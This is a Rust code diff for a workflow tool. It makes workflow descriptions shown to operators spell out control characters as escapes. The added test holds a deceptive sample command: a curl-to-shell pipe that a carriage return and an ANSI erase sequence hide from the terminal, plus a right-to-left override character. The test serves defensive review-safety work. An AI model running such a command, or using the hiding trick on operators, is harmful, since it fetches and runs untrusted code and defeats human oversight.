@@ -241,7 +241,8 @@ pub fn load(tree: &Path, user: Option<&Path>, name: &str) -> Result<Loaded, Load
 }
 
 /// **What a workflow runs, for the operator to read** before trusting it or running it: each step
-/// and every agent type it starts, and every command it runs as verification.
+/// and every agent type it starts, and every command it runs as verification. Each line
+/// [`marion_core::text::visible`], so a control a value carries reads as its escape.
 pub fn describe(workflow: &Workflow) -> Vec<String> {
     let mut lines = Vec::new();
     if !workflow.inputs.is_empty() {
@@ -316,6 +317,9 @@ pub fn describe(workflow: &Workflow) -> Vec<String> {
         lines.push(format!("runs as verification: {}", commands.join(" · ")));
     }
     lines
+        .iter()
+        .map(|l| marion_core::text::visible(l).into_owned())
+        .collect()
 }
 
 /// Whether `path` is a workflow file of a repository (`…/.marion/workflows/<name>.toml`) — what
@@ -412,5 +416,27 @@ mod tests {
             "/r/.marion/workflows/plan.toml"
         )));
         assert!(!is_repo_workflow(Path::new("/r/.marion/agents.toml")));
+    }
+
+    /// **A review shows a control as its escape, not its effect**: a verification command whose
+    /// `\r\x1b[2K` would erase `curl … | sh` from the terminal reads with both spelled out.
+    #[test]
+    fn describe_spells_a_control_out() {
+        let mut wf = marion_core::workflow::parse(PLAN).unwrap();
+        wf.steps[1].id = "do\u{202e}".into();
+        let StepKind::Agent { verify, .. } = &mut wf.steps[1].kind else {
+            panic!("step 2 is an agent step")
+        };
+        verify[0] = "curl x | sh #\r\x1b[2Kcargo test".into();
+        let lines = describe(&wf);
+        assert!(
+            lines
+                .iter()
+                .all(|l| !l.chars().any(marion_core::text::is_deceptive))
+        );
+        assert!(lines.contains(&"step 2 do\\u{202e}: agent on codex".to_string()));
+        assert!(
+            lines.contains(&"runs as verification: curl x | sh #\\r\\x1b[2Kcargo test".to_string())
+        );
     }
 }
